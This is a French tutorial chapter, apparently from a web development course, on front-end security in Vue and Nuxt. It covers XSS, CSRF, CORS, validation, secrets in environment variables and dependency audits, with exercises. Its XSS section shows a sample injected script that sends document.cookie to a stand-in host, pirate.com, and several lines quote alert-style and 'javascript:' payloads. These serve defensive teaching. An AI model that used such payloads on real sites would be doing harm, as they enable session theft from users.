# 02 — Sécurité front-end

---

> **🔄 Rappel du cours précédent**
> Avant de continuer, vérifie que tu peux répondre à ces questions :
> 1. Qu'est-ce qu'un JWT et à quoi sert-il ?
> 2. Quelle est la différence entre access token et refresh token ?
> 
> <details>
> <summary>Vérifier mes réponses</summary>
>
> 1. JSON Web Token — un jeton signé contenant les infos utilisateur, utilisé pour l'authentification
> 2. L'access token est courte durée pour les requêtes API, le refresh token permet d'obtenir un nouvel access token
> </details>

---

## 🏠 L'analogie de la maison

Tout au long de ce chapitre, on va comparer ton application à **une maison** :

- **Ta maison** = ton application web
- **Les portes et fenêtres** = les endroits ou des données entrent et sortent
- **Les cambrioleurs** = les pirates / attaquants
- **Les serrures et alarmes** = les protections de sécurité

Même si tu vis dans un bon quartier (un serveur sécurisé), il faut quand même **fermer tes fenêtres** (sécuriser ton code front-end) !

---

## 🎯 Les menaces principales

Voici les 4 attaques les plus courantes contre les applications web :

| Menace | Analogie maison | Ce que ça fait |
| --- | --- | --- |
| **XSS** | Quelqu'un glisse un micro espion dans ta maison | Un pirate injecte du code malveillant dans ton site |
| **CSRF** | Quelqu'un imite ta signature pour passer des commandes | Un site malveillant envoie des requêtes en se faisant passer pour toi |
| **CORS mal configuré** | Tu laisses n'importe qui entrer par la porte de service | Ton serveur accepte des requêtes venant de n'importe quel site |
| **Clickjacking** | On met une vitre invisible devant ta porte → tu crois appuyer sur ta sonnette mais tu ouvres à un inconnu | Ton site est chargé dans un cadre invisible, l'utilisateur clique sans le savoir |

---

## 🕷️ XSS (Cross-Site Scripting)

### C'est quoi le XSS ?

> **XSS** = **Cross-Site Scripting** (on écrit XSS pour ne pas confondre avec CSS)
>
> **Analogie** : Imagine que quelqu'un réussisse à coller un **faux interphone** sur ta maison.
> Quand un visiteur sonne, au lieu d'entendre ta voix, il entend le pirate qui lui dit
> « Donne-moi tes clés ». Le visiteur croit parler au propriétaire !
>
> Dans une app web, c'est pareil : le pirate injecte du **code JavaScript malveillant**
> dans ton site. Quand un utilisateur visite la page, ce code s'exécute comme si c'était
> le tien, et peut **voler des données**, des **cookies**, des **mots de passe**...

### Comment ça arrive concrètement ?

Imagine un champ de commentaire sur ton site. Un pirate écrit ceci comme commentaire :

```html
<!-- Ce que le pirate tape dans le champ de commentaire : -->
<script>
  // Ce code malveillant s'exécutera chez tous les utilisateurs qui voient le commentaire !
  // Il vole le cookie de session et l'envoie au pirate
  fetch('https://pirate.com/steal?cookie=' + document.cookie)
</script>
```

Si ton site affiche ce commentaire tel quel, **le script s'exécute** dans le navigateur de tous les visiteurs !

### Vue 3 te protège par défaut ! 🛡️

Bonne nouvelle : Vue **échappe automatiquement** le contenu affiché avec les doubles accolades `{{ }}` :

```vue
<template>
  <!-- ✅ SÛR : Vue échappe automatiquement le contenu -->
  <p>{{ userInput }}</p>

  <!--
    Si userInput = "<script>alert('xss')</script>"

    Vue n'exécute PAS le script !
    Il affiche le texte brut : <script>alert('xss')</script>

    En coulisses, Vue transforme les caractères spéciaux :
    < devient &lt;
    > devient &gt;
    Donc le navigateur affiche du TEXTE, pas du CODE
  -->
</template>
```

> 💡 **« Échapper » un texte** = remplacer les caractères spéciaux HTML (`<`, `>`, `"`, etc.)
> par des versions inoffensives. Le navigateur les affiche comme du texte au lieu de les
> interpréter comme du code.

### ⚠️ Le piège : `v-html`

`v-html` est la **fenêtre ouverte** de ta maison Vue. Il affiche du HTML **sans l'échapper** :

```vue
<!-- ❌ DANGEREUX : v-html affiche du HTML brut, sans protection ! -->
<div v-html="userComment"></div>
<!--
  Si userComment contient <script>alert('xss')</script>
  → Le script S'EXÉCUTE pour de vrai !
  C'est comme ouvrir la fenêtre en grand et laisser entrer n'importe qui
-->

<!-- ✅ SOLUTION : Nettoyer le HTML AVANT de l'afficher -->
<script setup lang="ts">
import { computed } from 'vue'
import DOMPurify from 'dompurify'
// DOMPurify est une librairie qui "nettoie" le HTML
// Elle enlève tout ce qui est dangereux (scripts, événements onclick, etc.)
// mais garde le HTML inoffensif (gras, italique, liens...)

// On prend le commentaire brut et on le passe au nettoyeur
const safeHtml = computed(() => DOMPurify.sanitize(userComment.value))
// sanitize = nettoyer / désinfecter
// Comme un détecteur de métaux à l'entrée d'un bâtiment !
</script>

<!-- Maintenant c'est sûr d'utiliser v-html -->
<div v-html="safeHtml"></div>
```

### Autre piège : les URLs fournies par l'utilisateur

```ts
// ❌ DANGEREUX : un utilisateur pourrait mettre une URL JavaScript malveillante
const userUrl = 'javascript:alert("xss")'  // Ceci est une "URL" valide mais malveillante !
const html = `<a href="${userUrl}">Cliquez ici</a>`
// Quand quelqu'un clique → le JavaScript s'exécute !

// ✅ SOLUTION : Toujours vérifier que l'URL est vraiment une URL web
function isValidUrl(url: string): boolean {
  try {
    const parsed = new URL(url)            // On essaie de parser l'URL
    return ['http:', 'https:'].includes(parsed.protocol)
    // On n'accepte QUE les URLs qui commencent par http: ou https:
    // Donc "javascript:..." sera rejeté !
  } catch {
    return false  // Si new URL() échoue, ce n'est pas une URL valide
  }
}
```

---

## 🎭 CSRF (Cross-Site Request Forgery)

### C'est quoi le CSRF ?

> **CSRF** = **Cross-Site Request Forgery** (prononcé "sea-surf")
> Forgery = falsification, contrefaçon
>
> **Analogie** : Imagine que tu es connecté à ta banque en ligne (dans un onglet).
> Tu ouvres un autre onglet et tu visites un site piégé. Ce site contient un formulaire
> **invisible** qui envoie automatiquement une requête à ta banque :
> « Transférer 1000€ vers le compte du pirate ».
>
> Comme tu es connecté à ta banque (le cookie de session est encore valide),
> ta banque croit que c'est TOI qui as fait la demandé !
>
> C'est comme si quelqu'un imitait ta signature sur un chèque.

### Comment se protéger : le token CSRF

L'idée : le serveur donne un **code secret unique** à ton app. À chaque requête,
ton app doit renvoyer ce code. Le site pirate ne peut pas connaître ce code !

```ts
// utils/csrfFetch.ts
// Cette fonction ajoute automatiquement le token CSRF à chaque requête

export async function csrfFetch(
  url: string,
  options: RequestInit = {},
): Promise<Response> {

  // Le serveur a mis un token CSRF dans un cookie lisible par JavaScript
  // On le lit depuis les cookies du navigateur
  const csrfToken = document.cookie
    .split('; ')                              // Les cookies sont séparés par "; "
    .find(c => c.startsWith('XSRF-TOKEN='))   // On cherche celui qui s'appelle XSRF-TOKEN
    ?.split('=')[1]                           // On récupère la valeur après le "="
  // Le "?." (optional chaining) : si .find() ne trouve rien, on n'appelle pas .split()

  return fetch(url, {
    ...options,                       // On garde les options existantes
    credentials: 'include',          // On envoie les cookies avec la requête
    headers: {
      ...options.headers,            // On garde les headers existants
      'X-XSRF-TOKEN': csrfToken ?? '',  // On ajoute le token CSRF dans un header
      // Le serveur vérifie que ce header correspond au cookie
      // Le site pirate ne peut PAS lire nos cookies → il ne peut pas envoyer ce header !
    },
  })
}
```

### Protection par SameSite cookies

```ts
// Côté serveur (pour info, tu ne coderas pas ça en front)
// Le serveur configure ses cookies pour qu'ils ne soient PAS envoyés depuis d'autres sites

res.cookie('session', token, {
  httpOnly: true,       // Le cookie n'est PAS lisible par JavaScript
                        // → Protège contre le vol de cookie par XSS
  secure: true,         // Le cookie n'est envoyé QUE en HTTPS (pas en HTTP non chiffré)
  sameSite: 'strict',   // Le cookie n'est PAS envoyé si la requête vient d'un AUTRE site
                        // → Protège contre le CSRF !
  maxAge: 3600000,      // Le cookie expire après 1 heure (en millisecondes)
                        // 3 600 000 ms = 60 min × 60 sec × 1000 ms
})
```

---

## 🌐 CORS (Cross-Origin Resource Sharing)

### C'est quoi CORS ?

> **Analogie** : Ton serveur API, c'est ta maison. Les navigateurs web ont une **règle de sécurité** :
> par défaut, un site web ne peut pas appeler l'API d'un AUTRE site.
>
> Exemple : ton front sur `http://localhost:5173` veut appeler ton API sur `http://localhost:3000`.
> Ce sont deux "origines" différentes (ports différents) → le navigateur **bloque** la requête !
>
> **CORS** c'est la liste d'invités de ta maison : « Ces personnes ont le droit d'entrer. »
> Le serveur dit au navigateur : « J'accepte les requêtes venant de tel site. »

C'est configuré **côté serveur** (pas côté front), mais c'est important de comprendre pourquoi tu peux voir une erreur CORS :

```
❌ Access to fetch at 'http://localhost:3000/api/users'
   from origin 'http://localhost:5173' has been blocked by CORS policy
```

→ Cela signifie que le serveur n'a pas autorisé ton site à l'appeler. Il faut configurer le serveur pour accepter ton origine.

---

## ✅ Validation côté client

> **Règle d'or** : La validation côté client est pour le **confort de l'utilisateur**.
> La validation côté **serveur** est pour la **sécurité**.
> **Toujours les deux !** Un pirate peut contourner le front très facilement.

```ts
// composables/useValidation.ts
// On utilise la librairie "zod" pour définir des règles de validation

import { z } from 'zod'
// Zod permet de définir la "forme" attendue des données
// et de vérifier si les données correspondent

// Règle pour l'email : doit être une chaîne de caractères au format email
const emailSchema = z.string().email('Email invalide')

// Règles pour le mot de passe : plusieurs critères
const passwordSchema = z
  .string()
  .min(8, '8 caractères minimum')                // Au moins 8 caractères
  .regex(/[A-Z]/, '1 majuscule requise')          // Au moins une lettre majuscule
  .regex(/[0-9]/, '1 chiffre requis')             // Au moins un chiffre
  .regex(/[^a-zA-Z0-9]/, '1 caractère spécial requis')  // Au moins un symbole (!@#$...)

// Rappel regex (expressions régulières) :
// /[A-Z]/         → cherche AU MOINS une lettre entre A et Z (majuscule)
// /[0-9]/         → cherche AU MOINS un chiffre entre 0 et 9
// /[^a-zA-Z0-9]/  → cherche AU MOINS un caractère qui N'EST PAS une lettre ou un chiffre

export function useValidation() {

  // Vérifie un email. Retourne null si OK, ou un message d'erreur
  function validateEmail(email: string): string | null {
    const result = emailSchema.safeParse(email)
    // safeParse essaie de valider sans lancer d'erreur
    // result.success = true si c'est valide, false sinon
    return result.success ? null : result.error.issues[0].message
    // Si valide → null (pas d'erreur)
    // Si invalide → on retourne le premier message d'erreur
  }

  // Vérifie un mot de passe. Même logique.
  function validatePassword(password: string): string | null {
    const result = passwordSchema.safeParse(password)
    return result.success ? null : result.error.issues[0].message
  }

  return { validateEmail, validatePassword }
}
```

---

## 📦 Variables d'environnement

> **Analogie** : Les variables d'environnement, c'est comme les **étiquettes sur les tiroirs** de ta maison.
> Certains tiroirs sont visibles par les invités (variables publiques), et d'autres sont
> dans ton coffre-fort (variables secrètes côté serveur uniquement).

```ts
// ❌ JAMAIS DE SECRETS DANS LE CODE FRONT !
const API_KEY = 'sk-1234567890'  // DANGER ! Cette valeur sera visible dans le bundle JS
// N'importe qui peut ouvrir les outils de développement du navigateur (F12)
// et voir cette valeur dans le code source !

// ✅ Comment faire correctement :
// 1. Créer un fichier .env à la racine du projet

// .env
// Les variables qui commencent par VITE_ sont accessibles côté client (PUBLIQUES)
// VITE_API_BASE=https://api.example.com
// VITE_PUBLIC_KEY=pk_live_xxx

// Les variables SANS le préfixe VITE_ restent côté serveur (SECRÈTES)
// API_SECRET=sk_secret_xxx     ← Jamais accessible dans le navigateur !
```

```ts
// ✅ Accéder aux variables publiques dans ton code Vue/Vite
const apiBase = import.meta.env.VITE_API_BASE
// import.meta.env contient toutes les variables d'environnement VITE_*
// Au moment du build, Vite remplace ces valeurs directement dans le code

// ✅ Avec Nuxt : runtimeConfig
const config = useRuntimeConfig()
const publicBase = config.public.apiBase  // Accessible côté client (public)
const secret = config.apiSecret           // Accessible UNIQUEMENT côté serveur (Nuxt SSR)
```

---

## 🔍 Vérifier les dépendances vulnérables

> Les librairies que tu installes (pnpm install) peuvent contenir des **failles de sécurité**.
> C'est comme acheter une serrure qui à un défaut de fabrication.

```bash
# Vérifier si tes dépendances ont des failles connues
pnpm audit

# Essayer de corriger automatiquement (met à jour les versions)
pnpm audit --fix

# Vérifier les licences de tes dépendances
npx license-checker --summary
```

**Bonne pratique** : Ajouter `pnpm audit` dans ton pipeline CI (intégration continue).
Si une vulnérabilité critique est trouvée → le build échoue et t'alerte.

---

## 📋 Checklist sécurité front-end

Utilise cette liste pour vérifier la sécurité de ton application :

- [ ] ✅ Pas de `v-html` sans nettoyage (utiliser DOMPurify)
- [ ] ✅ Pas de `eval()` ni `new Function()` (ces fonctions exécutent du texte comme du code → très dangereux)
- [ ] ✅ Tokens JWT en mémoire, refreshToken en cookie HttpOnly
- [ ] ✅ Validation avec Zod côté client **ET** côté serveur
- [ ] ✅ `pnpm audit` dans le pipeline CI
- [ ] ✅ Headers CSP (Content Security Policy) configurés sur le serveur
- [ ] ✅ Aucun secret dans le code front (les variables `VITE_` sont **PUBLIQUES**)
- [ ] ✅ URLs fournies par les utilisateurs toujours vérifiées (bloquer `javascript:`)
- [ ] ✅ CORS configuré strictement côté serveur

---

## 📝 Résumé

| Menace | C'est quoi ? | Comment se protéger |
| --- | --- | --- |
| **XSS** | Du code malveillant injecté dans ton site | Vue échappe par défaut. Éviter `v-html`. Utiliser DOMPurify si besoin |
| **CSRF** | Un site pirate envoie des requêtes en ton nom | Token CSRF + cookies SameSite |
| **CORS** | Un site non autorisé essaie d'appeler ton API | Configurer le serveur pour n'accepter que tes origines |
| **Secrets exposés** | Clés API visibles dans le code front | Ne jamais mettre de secrets dans le code client |

---

## 🎯 Pratique

### Exercice SEC.1 — XSS et v-html

Ce code est-il sécurisé ? Comment l'améliorer ?

```vue
<template>
  <div v-html="userComment"></div>
</template>

<script setup>
const userComment = '<script>alert("hack!")</script>'
</script>
```

<details>
<summary>Solution</summary>

❌ **Non sécurisé** : `v-html` avec du contenu utilisateur = faille XSS.

✅ **Solution avec DOMPurify** :
```vue
<template>
  <div v-html="sanitizedComment"></div>
</template>

<script setup>
import DOMPurify from 'dompurify'
const userComment = '<script>alert("hack!")</script>'
const sanitizedComment = DOMPurify.sanitize(userComment)
// Retourne le texte sans le script malveillant
</script>
```
</details>

---

### Exercice SEC.2 — Validation des URLs

Cette URL utilisateur est-elle sécurisée ?

```ts
const userUrl = 'javascript:alert(document.cookie)'
```

Comment valider les URLs ?

<details>
<summary>Solution</summary>

❌ **Dangereux** : `javascript:` exécute du code !

✅ **Validation** :
```ts
function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url)
    return ['http:', 'https:'].includes(parsed.protocol)
  } catch {
    return false
  }
}
```
</details>

---

### Exercice SEC.3 — Variables d'environnement

Laquelle de ces variables est sécurisée côté front ?

```bash
# .env
VITE_API_URL=https://api.example.com
VITE_STRIPE_SECRET_KEY=sk_live_xxxxx
DATABASE_URL=postgres://user:pass@db
```

<details>
<summary>Solution</summary>

- ✅ `VITE_API_URL` : OK, c'est public (URL de l'API)
- ❌ `VITE_STRIPE_SECRET_KEY` : **DANGER** ! Les variables `VITE_` sont visibles dans le bundle JavaScript
- ✅ `DATABASE_URL` : Sans préfixe `VITE_`, elle n'est PAS accessible côté front

**Règle** : Jamais de secrets dans les variables `VITE_*` !
</details>

---

## Suite

→ `cours/11-auth-securite/03-rbac-et-permissions.md`
